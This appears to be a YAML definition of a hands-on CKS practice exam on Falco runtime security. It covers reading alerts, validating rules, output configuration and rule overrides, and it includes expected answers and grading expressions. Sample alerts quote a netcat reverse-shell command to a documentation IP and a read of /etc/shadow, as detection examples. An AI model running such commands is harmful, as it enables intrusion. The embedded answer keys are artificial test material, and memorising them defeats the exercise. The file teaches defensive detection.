@@ -1,0 +1,2356 @@
+apiVersion: v1alpha1
+name: 'CKS (Hands-On): Falco and Runtime Security'
+k8sVersion: 1.34.0
+timing:
+  enabled: true
+  limitSeconds: 9000
+introduction:
+  elements:
+  - type: context
+    text: |
+      Hands-on practice for **Falco**, the runtime-security tool of the CKS exam. Typical tasks: find the
+      Pod that is doing something suspicious and act on it, change a rule's output or priority, write a
+      short rule from a specification, and send alerts to a file. This set has no multiple choice: you
+      write rules and configuration, type commands and read alerts, as on the exam.
+
+      **Lab environment**
+
+      - You work as `root` on `controlplane`, and on `node01` (the node the question tells you about)
+        after `ssh`. Kubernetes 1.34 with containerd; `kubectl` and `crictl` are available.
+      - Falco **0.45** was installed from the package, runs as a systemd service with the modern eBPF
+        driver, and reads `/etc/falco/falco.yaml`. Its rules are in `/etc/falco/falco_rules.yaml`
+        (default, never edit), `/etc/falco/falco_rules.local.yaml` and `/etc/falco/rules.d/`.
+      - Falco's syntax changed over the years: this set uses the **current** forms (`rules_files`,
+        `override:`), and points out the older ones you may still meet in tutorials (`rules_file`,
+        `append: true`).
+
+      **How answers are checked**
+
+      - *Commands* are checked structurally (tool, options and values). Where a question needs a pipeline
+        or a redirect, the whole command line is checked.
+      - *Rules and configuration snippets* are checked for the required elements, so spacing,
+        indentation style and the order of keys do not matter — except where a question says a format
+        is graded **exactly**.
+      - Question text states *what* is wanted, never which fields or options to use.
+
+      The Falco documentation on falco.org is on the list of allowed references for the real exam.
+      Exam content is under NDA: this is practice for the common patterns, not a prediction.
+  - type: references
+    links:
+    - url: https://falco.org/docs/
+      text: Falco documentation
+    - url: https://falco.org/docs/concepts/rules/overriding/
+      text: Overriding rules
+    - url: https://training.linuxfoundation.org/certification/certified-kubernetes-security-specialist-cks/
+      text: CKS Domains and Competencies
+manifestDefinitions:
+- id: networkpolicy-v1
+  kind: NetworkPolicy
+  apiVersion: networking.k8s.io/v1
+  autoLoad: true
+scenarios:
+- title: Which Falco Service Runs on This Node?
+  category: Operating Falco
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      On the exam, Falco is usually installed from packages and runs as a **systemd service on the
+      node**, not as a Pod. You are `root` on `node01`. The package ships a unit per driver, and
+      only one of them is enabled; you do not know which one was chosen when Falco was installed.
+  - type: question
+    question:
+      questionType: command
+      header: List the Falco-related systemd units on this node.
+      hint: systemd can list units and filter by name, either with a pattern argument or by piping through a text filter.
+      command:
+        executable: systemctl
+        strictness: permissive
+        subcommands:
+        - name: list-units
+          aliases:
+          - list-unit-files
+        flags:
+        - name: type
+          regex: ^service$
+        - name: all
+          short: a
+          boolean: true
+        - name: no-pager
+          boolean: true
+      cel: answer.matches(r'\|\s*grep\s+(-i\s+)?[\x27"]?falco') || answer.matches(r'falco\*')
+  - type: manifest
+    header: $ systemctl list-units | grep falco
+    content: |
+      falco-modern-bpf.service           loaded active running Falco: Container Native Runtime Security with modern ebpf
+      falcoctl-artifact-follow.service   loaded active running Falcoctl Artifact Follow: automatic artifacts update service
+  - type: question
+    question:
+      questionType: single-line
+      expectedAnswer: falco-modern-bpf.service
+      header: Which of these units is Falco itself (not its rule updater)? Answer with the unit name.
+      hint: The other unit is the helper that keeps the rule files up to date.
+      correctAnswerInfo: 'The unit name encodes the driver: falco-kmod (kernel module), falco-bpf (legacy eBPF probe) or falco-modern-bpf
+        (modern eBPF). Enabling one also creates an alias falco.service.'
+      cel: answer.trim() in ['falco-modern-bpf.service', 'falco-modern-bpf']
+  - type: question
+    question:
+      questionType: command
+      header: Check whether that unit is running.
+      hint: One systemctl verb shows the state, recent log lines and the main PID of a unit.
+      command:
+        executable: systemctl
+        subcommands:
+        - name: status
+        positionals:
+        - index: 0
+          regex: ^falco(-modern-bpf)?(\.service)?$
+        flags:
+        - name: no-pager
+          boolean: true
+        - name: lines
+          short: n
+          regex: ^\d+$
+  - type: manifest
+    header: $ systemctl status falco-modern-bpf
+    content: |
+      ● falco-modern-bpf.service - Falco: Container Native Runtime Security with modern ebpf
+           Loaded: loaded (/usr/lib/systemd/system/falco-modern-bpf.service; enabled; preset: enabled)
+           Active: active (running) since Tue 2026-10-20 08:02:11 UTC; 2h 41min ago
+             Docs: https://falco.org/docs/
+         Main PID: 1042 (falco)
+  explanation:
+    elements:
+    - type: context
+      text: |
+        Package installs of Falco create one unit per driver — `falco-kmod.service`,
+        `falco-bpf.service`, `falco-modern-bpf.service` (and `falco-custom.service`) — plus the
+        `falcoctl-artifact-follow.service` helper that updates rules. Enabling a unit also creates the
+        **alias** `falco.service`, so `systemctl status falco` often works too, but only the full name
+        is certain. `systemctl list-units | grep falco` finds what is actually loaded.
+
+        If Falco runs as a DaemonSet instead (Helm install), there is no unit at all: you read logs with
+        `kubectl logs` — see the DaemonSet scenario.
+    - type: references
+      links:
+      - url: https://falco.org/docs/setup/packages/
+        text: Install Falco from packages (systemd units)
+- title: Reading Falco's Alerts from the Journal
+  category: Operating Falco
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      Falco's default output channels are **stdout and syslog**; for a systemd service both end up in
+      the journal. You are on `node01`, where Falco runs as the unit `falco-modern-bpf`.
+  - type: question
+    question:
+      questionType: command
+      header: Keep the alerts of the Falco unit on screen as new ones arrive.
+      hint: journalctl filters by unit with one option, and has another that behaves like tail -f.
+      command:
+        executable: journalctl
+        flags:
+        - name: unit
+          short: u
+          required: true
+          regex: ^falco(-modern-bpf)?(\.service)?$
+        - name: follow
+          short: f
+          required: true
+          boolean: true
+        - name: no-pager
+          boolean: true
+        - name: lines
+          short: n
+          regex: ^\d+$
+  - type: question
+    question:
+      questionType: command
+      header: Instead, show only what the Falco unit logged during the last 10 minutes.
+      hint: The journal can be limited to a time window relative to now.
+      command:
+        executable: journalctl
+        flags:
+        - name: unit
+          short: u
+          required: true
+          regex: ^falco(-modern-bpf)?(\.service)?$
+        - name: since
+          required: true
+          regex: ^(10 min(ute)?s? ago|-10 ?m(in(ute)?s?)?)$
+        - name: no-pager
+          boolean: true
+  - type: manifest
+    header: $ journalctl -u falco-modern-bpf --since "10 minutes ago"
+    content: |
+      Oct 20 10:14:02 node01 falco[1042]: 10:14:02.118429331: Notice A shell was spawned in a container with an attached terminal (user=root command=sh)
+      Oct 20 10:14:40 node01 falco[1042]: 10:14:40.902114870: Warning Sensitive file opened for reading by non-trusted program (user=root command=cat /etc/shadow file=/etc/shadow)
+      Oct 20 10:15:03 node01 falco[1042]: 10:15:03.337790145: Critical Reverse shell tool started (user=www-data command=nc -e /bin/sh 203.0.113.9 4444)
+      Oct 20 10:15:31 node01 falco[1042]: 10:15:31.640022918: Error File below /etc opened for writing (user=root command=sh -c echo x >> /etc/hosts file=/etc/hosts)
+  - type: question
+    question:
+      questionType: single-line
+      expectedAnswer: www-data
+      header: Which user started the process behind the Critical alert?
+      hint: Alerts show their priority right after the timestamp.
+      cel: answer.trim() == 'www-data'
+  explanation:
+    elements:
+    - type: context
+      text: |
+        An alert line has the shape `<time>: <Priority> <rule output>`; in the journal it is prefixed with
+        the usual `date host unit[pid]:`. Useful variations:
+
+        | Command | Use |
+        |---|---|
+        | `journalctl -u falco-modern-bpf -f` | follow live |
+        | `journalctl -u falco-modern-bpf --since "5 min ago"` | recent window |
+        | `journalctl -u falco-modern-bpf \| grep "<rule name>"` | filter by rule |
+
+        Alerts can also be sent to a file (see the output configuration scenarios) or read from syslog.
+    - type: references
+      links:
+      - url: https://falco.org/docs/concepts/outputs/channels/
+        text: Falco output channels
+- title: Falco as a DaemonSet
+  category: Operating Falco
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      In this cluster Falco was installed with Helm instead: one Falco Pod runs on every node, in the
+      namespace `falco`. The suspicious workload runs on `node01`, so you only want the alerts
+      **produced on that node**.
+  - type: question
+    question:
+      questionType: command
+      header: Show the Falco Pods with the node each one runs on.
+      hint: The standard get output has no node column unless you ask for more columns.
+      command:
+        executable: kubectl
+        subcommands:
+        - name: get
+        positionals:
+        - index: 0
+          oneOf:
+          - pods
+          - pod
+          - po
+        flags:
+        - name: namespace
+          short: n
+          required: true
+          value: falco
+        - name: output
+          short: o
+          required: true
+          value: wide
+  - type: table
+    style: terminal
+    columns:
+    - NAME
+    - READY
+    - STATUS
+    - RESTARTS
+    - AGE
+    - IP
+    - NODE
+    rows:
+    - - falco-5wk2d
+      - 2/2
+      - Running
+      - '0'
+      - 3d
+      - 10.244.1.7
+      - node01
+    - - falco-q7m4x
+      - 2/2
+      - Running
+      - '0'
+      - 3d
+      - 10.244.2.5
+      - node02
+  - type: question
+    question:
+      questionType: command
+      header: Read the alerts of the Falco Pod on node01.
+      hint: Pick the Pod from the table by its node. Alerts go to the container's standard output.
+      correctAnswerInfo: A label selector (-l app.kubernetes.io/name=falco) would return the alerts of both nodes mixed together.
+      command:
+        executable: kubectl
+        subcommands:
+        - name: logs
+        positionals:
+        - index: 0
+          value: falco-5wk2d
+        flags:
+        - name: namespace
+          short: n
+          required: true
+          value: falco
+        - name: container
+          short: c
+          value: falco
+        - name: follow
+          short: f
+          boolean: true
+  - type: manifest
+    header: $ kubectl logs -n falco falco-5wk2d
+    content: |
+      Defaulted container "falco" out of: falco, falcoctl-artifact-follow, (init) falcoctl-artifact-install
+      Tue Oct 20 10:01:12 2026: Falco version: 0.45.1 (x86_64)
+      10:14:02.118429331: Notice A shell was spawned in a container with an attached terminal (user=root command=sh)
+      10:15:03.337790145: Critical Reverse shell tool started (user=www-data command=nc -e /bin/sh 203.0.113.9 4444)
+  - type: question
+    question:
+      questionType: single-line
+      expectedAnswer: output is buffered
+      header: You trigger a new alert and it does not show up in kubectl logs for several minutes. Which behaviour of Falco's
+        standard output explains that? Answer in a few words.
+      hint: Output sent to a pipe is normally collected in blocks before it is written.
+      correctAnswerInfo: Falco's stdout is buffered. The -U / --unbuffered option flushes every line immediately, at the cost
+        of more CPU.
+      cel: answer.lowerAscii().matches(r'buffer|unbuffered|-u\b')
+  explanation:
+    elements:
+    - type: context
+      text: |
+        With the Helm chart each node runs a Falco Pod that sees **only the events of its own node**, so
+        the first job is to pick the right Pod (`-o wide`). The Pod has several containers; Falco itself
+        is the container named `falco` (the others are helpers for rule updates). Alerts go to the
+        container's stdout, hence `kubectl logs`. For a sidecar-style investigation of several nodes use
+        the label `app.kubernetes.io/name=falco`:
+
+        ```
+        kubectl logs -n falco -l app.kubernetes.io/name=falco --prefix
+        ```
+
+        Standard-output buffering can delay alerts when stdout is not a terminal; `-U` (unbuffered) is the
+        remedy when you need them immediately.
+    - type: references
+      links:
+      - url: https://falco.org/docs/concepts/outputs/channels/
+        text: Falco output channels
+      - url: https://falco.org/docs/setup/kubernetes/
+        text: Install Falco on Kubernetes
+- title: 'Applying a Change: Restart and Check'
+  category: Operating Falco
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      You just edited a rules file on `node01`. Falco's configuration includes a setting that makes it
+      **watch its configuration and rule files** and reload itself when they change; relying on that is
+      fragile, and on the exam you should always apply a change explicitly and then look at the logs.
+  - type: question
+    question:
+      questionType: single-line
+      expectedAnswer: watch_config_files
+      header: Which falco.yaml setting makes Falco reload automatically when its configuration or rules files change? (It
+        is enabled by default.)
+      hint: The name says what is watched, and contains the word 'watch'.
+      cel: answer.trim() == 'watch_config_files'
+  - type: question
+    question:
+      questionType: command
+      header: Restart the Falco service so that it re-reads everything.
+      hint: A full restart of the unit is the explicit way to make a running service re-read its files.
+      command:
+        executable: systemctl
+        subcommands:
+        - name: restart
+        positionals:
+        - index: 0
+          regex: ^falco(-modern-bpf)?(\.service)?$
+  - type: question
+    question:
+      questionType: command
+      header: Look at the last 20 log lines of the unit to confirm that the rules were loaded without errors.
+      hint: One journalctl option limits the output to the most recent lines.
+      command:
+        executable: journalctl
+        flags:
+        - name: unit
+          short: u
+          required: true
+          regex: ^falco(-modern-bpf)?(\.service)?$
+        - name: lines
+          short: n
+          required: true
+          regex: ^\d+$
+        - name: no-pager
+          boolean: true
+  - type: manifest
+    header: $ journalctl -u falco-modern-bpf -n 20
+    content: |
+      Oct 20 11:02:15 node01 falco[2210]: Falco version: 0.45.1 (x86_64)
+      Oct 20 11:02:15 node01 falco[2210]: Falco initialized with configuration files:
+      Oct 20 11:02:15 node01 falco[2210]:    /etc/falco/falco.yaml
+      Oct 20 11:02:15 node01 falco[2210]: Loading rules from:
+      Oct 20 11:02:15 node01 falco[2210]:    /etc/falco/falco_rules.yaml | schema validation: ok
+      Oct 20 11:02:15 node01 falco[2210]:    /etc/falco/falco_rules.local.yaml | schema validation: ok
+      Oct 20 11:02:15 node01 falco[2210]:    /etc/falco/rules.d/custom.yaml | schema validation: ok
+  explanation:
+    elements:
+    - type: context
+      text: |
+        Falco reads rule and configuration files **at start-up**. Since Falco 0.32 the setting
+        `watch_config_files` (default `true`) also reloads them when they change on disk, but a restart is
+        still the unambiguous way to apply a change, and the log after the restart tells you the truth:
+
+        - the `Loading rules from:` block lists every file in load order, each with
+          `schema validation: ok`;
+        - an error here (YAML problem, unknown field or macro, bad priority) means the new configuration
+          was **not** applied — and a service that failed to start shows `failed` in `systemctl status`.
+
+        Always read the journal after a restart; do not assume the edit worked.
+    - type: references
+      links:
+      - url: https://falco.org/docs/concepts/
+        text: Falco concepts
+      - url: https://falco.org/docs/setup/packages/
+        text: Install Falco from packages (systemd units)
+- title: Validating Rules Before Restarting
+  category: Operating Falco
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      A colleague added `/etc/falco/rules.d/custom.yaml` and restarted Falco; the unit failed to start.
+      Before touching the service again you want Falco to **validate the rule files and exit**, without
+      running. The custom file uses macros (for process spawning and for scoping to containers) that are
+      defined in the default rules file, so a validation that sees only the custom file cannot resolve them.
+
+      The file:
+  - type: manifest
+    header: /etc/falco/rules.d/custom.yaml
+    content: |
+      - rule: Spawned netcat in container
+        desc: A network tool was started inside a container
+        condition: spawned_process and container and proc.nmae in (nc, ncat)
+        output: Network tool started (user=%user.name command=%proc.cmdline)
+        priority: WARNING
+  - type: question
+    question:
+      questionType: command
+      header: Validate the default rules file together with the custom file.
+      hint: The validation option can be given more than once, and files are processed in the order you list them — a file
+        that uses macros must come after the one that defines them.
+      correctAnswerInfo: Without the default file, the validation of custom.yaml alone would also report undefined-macro errors,
+        hiding the real problem.
+      command:
+        executable: falco
+        flags:
+        - name: validate
+          short: V
+          required: true
+          regex: ^/etc/falco/(falco_rules\.yaml|rules\.d/custom\.yaml)$
+          repeatable: true
+      cel: answer.contains('/etc/falco/falco_rules.yaml') && answer.contains('/etc/falco/rules.d/custom.yaml') && answer.indexOf('falco_rules.yaml')
+        < answer.indexOf('custom.yaml')
+  - type: manifest
+    header: $ falco -V /etc/falco/falco_rules.yaml -V /etc/falco/rules.d/custom.yaml
+    content: |
+      Tue Oct 20 11:20:41 2026: Falco version: 0.45.1 (x86_64)
+      Tue Oct 20 11:20:41 2026: Loading rules from file /etc/falco/falco_rules.yaml
+      Tue Oct 20 11:20:41 2026: Loading rules from file /etc/falco/rules.d/custom.yaml
+      Tue Oct 20 11:20:41 2026: 1 Errors:
+      In rules content: (/etc/falco/rules.d/custom.yaml:0:0)
+          rule 'Spawned netcat in container': error compiling condition: filter_check called with nonexistent field proc.nmae
+  - type: question
+    question:
+      questionType: multiline
+      expectedAnswer: |
+        - rule: Spawned netcat in container
+          desc: A network tool was started inside a container
+          condition: spawned_process and container and proc.name in (nc, ncat)
+          output: Network tool started (user=%user.name command=%proc.cmdline)
+          priority: WARNING
+      header: Write the corrected content of /etc/falco/rules.d/custom.yaml (the rule must keep its name, intent and priority).
+      hint: The error message names the offending field. Compare it with the field names you know for process names.
+      cel: |-
+        (answer.matches(r'(^|\n)\s*(-\s+)?desc:\s*\S')) &&
+        (answer.matches(r'(^|\n)\s*-\s*rule:\s*[\x27"]?Spawned netcat in container[\x27"]?\s*($|\n)')) &&
+        (answer.matches(r'\bproc\.name\b')) &&
+        (!answer.matches(r'nmae')) &&
+        (answer.matches(r'\bspawned_process\b')) &&
+        (answer.matches(r'\bcontainer\b')) &&
+        (answer.matches(r'(^|\n)\s*priority:\s*[\x27"]?(?i:WARNING)[\x27"]?\s*($|\n|#)')) &&
+        (answer.matches(r'(^|\n)\s*(-\s+)?output:\s*\S')) &&
+        (answer.matches(r'proc\.name\s*(=\s*[\x27"]?(nc|ncat)|in\s*\([^)]*\b(nc|ncat)\b)'))
+  - type: manifest
+    header: $ falco -V /etc/falco/falco_rules.yaml -V /etc/falco/rules.d/custom.yaml
+    content: |
+      Tue Oct 20 11:24:09 2026: Loading rules from file /etc/falco/falco_rules.yaml
+      Tue Oct 20 11:24:09 2026: Loading rules from file /etc/falco/rules.d/custom.yaml
+      /etc/falco/falco_rules.yaml | schema validation: ok
+      /etc/falco/rules.d/custom.yaml | schema validation: ok
+      Ok
+  - type: question
+    question:
+      questionType: command
+      header: The files validate. Start the service again.
+      command:
+        executable: systemctl
+        subcommands:
+        - name: restart
+        positionals:
+        - index: 0
+          regex: ^falco(-modern-bpf)?(\.service)?$
+  explanation:
+    elements:
+    - type: context
+      text: |
+        `falco -V <file>` (long form `--validate`) loads the rules, reports errors and exits; it can be
+        given **several times** and processes the files in order, so list the default file first when your
+        file refers to its macros and lists. A **typo in a field name** (`proc.nmae`), an undefined macro, a
+        wrong priority or broken YAML all stop Falco from loading rules — and a service whose rules fail
+        to load does not start at all, which is why validating *before* restarting is the habit to build.
+
+        The exact wording of the error differs between versions; what matters is the rule name and the
+        thing the loader could not resolve.
+    - type: references
+      links:
+      - url: https://falco.org/docs/concepts/rules/
+        text: Falco rules
+      - url: https://falco.org/docs/concepts/rules/conditions/
+        text: Condition syntax
+- title: The Order of the Rules Files
+  category: Falco Configuration
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      A new rules file, `/opt/rules/custom_rules.yaml`, must be loaded by Falco on `node01`. It
+      **changes some of the default rules**, so it must be able to override them. The current setting in
+      `/etc/falco/falco.yaml` is:
+  - type: manifest
+    header: /etc/falco/falco.yaml (excerpt)
+    content: |
+      rules_files:
+        - /etc/falco/falco_rules.yaml
+        - /etc/falco/falco_rules.local.yaml
+        - /etc/falco/rules.d
+  - type: question
+    question:
+      questionType: multiline
+      expectedAnswer: |
+        rules_files:
+          - /etc/falco/falco_rules.yaml
+          - /etc/falco/falco_rules.local.yaml
+          - /etc/falco/rules.d
+          - /opt/rules/custom_rules.yaml
+      header: Write the new rules_files block, keeping the existing entries.
+      hint: Files are read in the order listed, and a definition in a later file can replace one from an earlier file.
+      correctAnswerInfo: 'Order matters twice: overrides must come after the definitions they change, and in ''first match
+        wins'' matching the more important rule must come first.'
+      cel: |-
+        (answer.matches(r'(^|\n)rules_files:')) &&
+        (answer.matches(r'/etc/falco/falco_rules\.yaml')) &&
+        (answer.matches(r'/etc/falco/falco_rules\.local\.yaml')) &&
+        (answer.matches(r'/etc/falco/rules\.d')) &&
+        (answer.matches(r'/opt/rules/custom_rules\.yaml')) &&
+        (answer.indexOf('/opt/rules/custom_rules.yaml') > answer.lastIndexOf('/etc/falco/'))
+  - type: question
+    question:
+      questionType: single-line
+      expectedAnswer: rules_file
+      header: Before Falco 0.38 the same key was named in the singular. What was it called?
+      correctAnswerInfo: Older tutorials and exam material may still use rules_file. Current Falco documents rules_files (plural),
+        and the old name is deprecated.
+      cel: answer.trim() == 'rules_file'
+  explanation:
+    elements:
+    - type: context
+      text: |
+        `rules_files` is a list of files **or directories** (a directory loads every `.yaml`/`.yml` file in it,
+        alphabetically; since Falco 0.41 other extensions are ignored). They are loaded in the order
+        written:
+
+        | Entry | Role |
+        |---|---|
+        | `/etc/falco/falco_rules.yaml` | the default rules shipped with Falco — overwritten on upgrade, never edit it |
+        | `/etc/falco/falco_rules.local.yaml` | your local overrides (created once, never overwritten) |
+        | `/etc/falco/rules.d/` | additional rule files |
+
+        Put your customisation **after** the file it modifies. You can also override the list for one run
+        with repeated `-r` options on the command line.
+    - type: references
+      links:
+      - url: https://falco.org/docs/concepts/rules/overriding/
+        text: Overriding rules
+      - url: https://falco.org/docs/concepts/rules/default-custom/
+        text: Default and local rules
+- title: Writing Alerts to a File
+  category: Falco Configuration
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      The compliance team collects Falco alerts from a file. On `node01`, alerts must be **appended to
+      `/var/log/falco/alerts.log`** in addition to the existing channels (leave those alone). The default
+      configuration has the file channel present but switched off.
+  - type: question
+    question:
+      questionType: multiline
+      expectedAnswer: |
+        file_output:
+          enabled: true
+          keep_alive: false
+          filename: /var/log/falco/alerts.log
+      header: Write the file-output block of /etc/falco/falco.yaml that achieves this.
+      hint: Each output channel is a block with an 'enabled' switch; the file channel additionally needs to know where to
+        write.
+      correctAnswerInfo: 'keep_alive is optional: false (default) reopens the file for every alert, true keeps it open and
+        buffers. Falco does not rotate the file.'
+      cel: |-
+        (answer.matches(r'(^|\n)file_output:')) &&
+        (answer.matches(r'(^|\n)\s*(-\s+)?enabled:\s*true\s*($|\n|#)')) &&
+        (answer.matches(r'(^|\n)\s+filename:\s*[\x27"]?/var/log/falco/alerts\.log[\x27"]?\s*($|\n)')) &&
+        (!answer.matches(r'enabled:\s*false')) &&
+        (!answer.matches(r'stdout_output')) &&
+        (!answer.matches(r'syslog_output'))
+  - type: context
+    text: |
+      After restarting Falco, you want to watch the file fill up while you trigger test events.
+  - type: question
+    question:
+      questionType: command
+      header: Follow the alerts file as it grows.
+      hint: The classic command for watching a growing file keeps reading after the end of the file.
+      command:
+        executable: tail
+        positionals:
+        - index: 0
+          value: /var/log/falco/alerts.log
+        flags:
+        - name: follow
+          short: f
+          boolean: true
+        - name: retry
+          boolean: true
+        - name: lines
+          short: n
+          regex: ^\d+$
+      cel: answer.matches(r'(^|\s)(-f|-F|--follow\S*)(\s|$)') || answer.matches(r'\s-\w*[fF]\w*\s')
+  explanation:
+    elements:
+    - type: context
+      text: |
+        The output channels each have an `enabled` switch; several can be active at once:
+
+        ```yaml
+        stdout_output:
+          enabled: true
+        syslog_output:
+          enabled: true
+        file_output:
+          enabled: true
+          keep_alive: false
+          filename: /var/log/falco/alerts.log
+        ```
+
+        Each alert becomes one line in the file. Falco **never rotates or truncates** it; if you use
+        logrotate, send `SIGUSR1` so that Falco reopens the file. Changes to `falco.yaml` are applied at
+        start-up/reload, so restart the service and check that the directory exists and is writable.
+    - type: references
+      links:
+      - url: https://falco.org/docs/concepts/outputs/channels/
+        text: Falco output channels
+- title: JSON Alerts and the Minimum Priority
+  category: Falco Configuration
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      A log shipper needs **one JSON object per alert**. In addition, Falco on `node01` is too noisy:
+      it must **ignore everything less severe than a warning** — rules of lower priority should not
+      even be loaded.
+  - type: question
+    question:
+      questionType: multiline
+      expectedAnswer: |
+        json_output: true
+        priority: warning
+      header: Write the two top-level settings for /etc/falco/falco.yaml.
+      hint: Two plain top-level keys. The priority value is one of the severity names used by rules.
+      cel: |-
+        (answer.matches(r'(^|\n)json_output:\s*true\s*($|\n|#)')) &&
+        (answer.matches(r'(^|\n)priority:\s*[\x27"]?(?i:warning)[\x27"]?\s*($|\n|#)'))
+  - type: question
+    question:
+      questionType: single-line
+      expectedAnswer: emergency, alert, critical, error
+      header: 'With the setting priority: error, which priorities are reported? List them from most to least severe, separated
+        by commas.'
+      hint: The configured level is the least severe one that is still reported; everything more severe is too.
+      correctAnswerInfo: 'The full order, most to least severe: emergency, alert, critical, error, warning, notice, informational
+        (info), debug.'
+      cel: answer.lowerAscii().replace(' ', '') == 'emergency,alert,critical,error'
+  - type: context
+    text: |
+      A JSON alert, as written by Falco, looks like this:
+  - type: manifest
+    header: alert (one line)
+    content: |
+      {"hostname":"node01","output":"10:15:03.337790145: Critical Reverse shell tool started (user=www-data command=nc -e /bin/sh 203.0.113.9 4444)","output_fields":{"evt.time":1760955303337790145,"proc.cmdline":"nc -e /bin/sh 203.0.113.9 4444","user.name":"www-data"},"priority":"Critical","rule":"Reverse shell tool started","source":"syscall","tags":["network"],"time":"2026-10-20T10:15:03.337790145Z"}
+  - type: question
+    question:
+      questionType: single-line
+      expectedAnswer: output_fields
+      header: Which JSON key holds the individual fields (such as user.name and proc.cmdline) as separate values, in addition
+        to the formatted message?
+      correctAnswerInfo: output is the formatted text; output_fields carries the same values as structured data, which log
+        pipelines can query.
+      cel: answer.trim() == 'output_fields'
+  explanation:
+    elements:
+    - type: context
+      text: |
+        - `json_output: true` makes every alert a JSON document (also for the rules-loading messages),
+          which is what shippers such as Falcosidekick or Fluent Bit expect.
+        - `priority:` is a **minimum**. Rules with a priority **less severe** than the setting are not
+          loaded at all: with `warning`, the default `Terminal shell in container` rule (priority
+          `NOTICE`) does nothing — a classic reason for a missing alert.
+        - The accepted names are `emergency`, `alert`, `critical`, `error`, `warning`, `notice`,
+          `informational` (or `info`) and `debug`, case-insensitive.
+    - type: references
+      links:
+      - url: https://falco.org/docs/concepts/outputs/channels/
+        text: Falco output channels
+      - url: https://falco.org/docs/concepts/rules/basic-elements/
+        text: 'Falco rules: basic elements'
+- title: Adding Pod Information to Every Alert
+  category: Falco Configuration
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      Many default rules print the process and file involved but not **which Pod** is responsible, so
+      every investigation starts with extra work. Without editing any rule, you want **every alert that
+      comes from a system call** to end with the container name, the Pod name and the namespace (written
+      as `container=… pod=… ns=…`, in that order).
+  - type: question
+    question:
+      questionType: multiline
+      expectedAnswer: |
+        append_output:
+          - match:
+              source: syscall
+            extra_output: "container=%container.name pod=%k8s.pod.name ns=%k8s.ns.name"
+      header: Write the setting for /etc/falco/falco.yaml.
+      hint: The setting is a list; each entry can say which rules it applies to and what text to append. Fields that are only
+        added to the JSON output do not change the text message.
+      correctAnswerInfo: extra_fields only enrich the JSON output_fields and never change the regular text line; extra_output
+        is what is appended to the message.
+      cel: |-
+        (answer.matches(r'(^|\n)append_output:')) &&
+        (answer.matches(r'extra_output:\s*[\x27"]?[^\n]*%container\.name[^\n]*%k8s\.pod\.name[^\n]*%k8s\.ns\.name')) &&
+        (answer.matches(r'source:\s*syscall|(^|\n)\s*-\s*extra_output')) &&
+        (answer.matches(r'container=%container\.name')) &&
+        (answer.matches(r'pod=%k8s\.pod\.name')) &&
+        (answer.matches(r'ns=%k8s\.ns\.name'))
+  explanation:
+    elements:
+    - type: context
+      text: |
+        `append_output` (in `falco.yaml`, Falco 0.39+) adds text or fields to many rules at once — much
+        easier than touching each rule:
+
+        ```yaml
+        append_output:
+          - match:
+              source: syscall            # or: rule: "<name>"  or: tags: [container]
+            extra_output: "container=%container.name pod=%k8s.pod.name ns=%k8s.ns.name"
+            extra_fields:
+              - k8s.pod.uid              # only added to the JSON output_fields
+        ```
+
+        Without `match`, the entry applies to every rule. To *replace* the output of one rule instead,
+        use an override in a rules file (see the override scenarios).
+    - type: references
+      links:
+      - url: https://falco.org/docs/concepts/outputs/formatting/
+        text: Alert formatting
+- title: Which File Do You Customise?
+  category: Rule Files and Overrides
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      A colleague tuned a default rule by editing the shipped rules file directly. After the next
+      package upgrade the change vanished. Answer with absolute paths.
+  - type: question
+    question:
+      questionType: sequence
+      header: Name the two files.
+      hint: Both live in /etc/falco; one has 'local' in its name.
+      steps:
+      - questionType: single-line
+        expectedAnswer: /etc/falco/falco_rules.yaml
+        header: 'The rules file that ships with Falco and is replaced during upgrades (never edit it):'
+        cel: answer.trim() == '/etc/falco/falco_rules.yaml'
+      - questionType: single-line
+        expectedAnswer: /etc/falco/falco_rules.local.yaml
+        header: 'The file meant for your own local changes, which package upgrades do not overwrite:'
+        cel: answer.trim() == '/etc/falco/falco_rules.local.yaml'
+  explanation:
+    elements:
+    - type: context
+      text: |
+        **Never edit `falco_rules.yaml`.** The package overwrites it on every upgrade. Customise in:
+
+        - `/etc/falco/falco_rules.local.yaml` — created empty at install, never overwritten; or
+        - a file in `/etc/falco/rules.d/` — handy for one file per topic.
+
+        Both are listed *after* the default file in `rules_files`, so they can override what it defines.
+        On the exam you can also write a **new rule** in either file without any override.
+    - type: references
+      links:
+      - url: https://falco.org/docs/concepts/rules/default-custom/
+        text: Default and local rules
+      - url: https://falco.org/docs/concepts/rules/overriding/
+        text: Overriding rules
+- title: Raising the Priority of a Default Rule
+  category: Rule Files and Overrides
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      The default rule `Terminal shell in container` (priority `NOTICE`) fires whenever someone opens
+      an interactive shell in a container, for example through `kubectl exec -it`. On `node01` the
+      security team wants those alerts classified as **CRITICAL**. The change must survive upgrades.
+  - type: question
+    question:
+      questionType: multiline
+      expectedAnswer: |
+        - rule: Terminal shell in container
+          priority: CRITICAL
+          override:
+            priority: replace
+      header: Write the content of /etc/falco/falco_rules.local.yaml that changes only that.
+      hint: 'Naming the rule and giving the new value is not enough: you must also say how the new value combines with the
+        existing one.'
+      correctAnswerInfo: 'With override.priority: replace, only the fields you list change — desc, condition and output stay
+        as defined in falco_rules.yaml. Copying the whole rule works too, but then you own the maintenance.'
+      cel: |-
+        (answer.matches(r'(^|\n)\s*-\s*rule:\s*[\x27"]?Terminal shell in container[\x27"]?\s*($|\n)')) &&
+        (answer.matches(r'(^|\n)\s*priority:\s*[\x27"]?(?i:CRITICAL)[\x27"]?\s*($|\n|#)')) &&
+        (answer.matches(r'(override:\s*(\n\s+|\{\s*)priority:\s*replace)|(\n\s+condition:[^\n]*shell_procs[^\n]*\n(.*\n)*\s+output:)|(\n\s+condition:\s*>[^\n]*\n(.*\n)*\s+output:)'))
+  explanation:
+    elements:
+    - type: context
+      text: |
+        The current way to modify an existing rule is the **`override` section** (Falco 0.37+):
+
+        ```yaml
+        - rule: Terminal shell in container
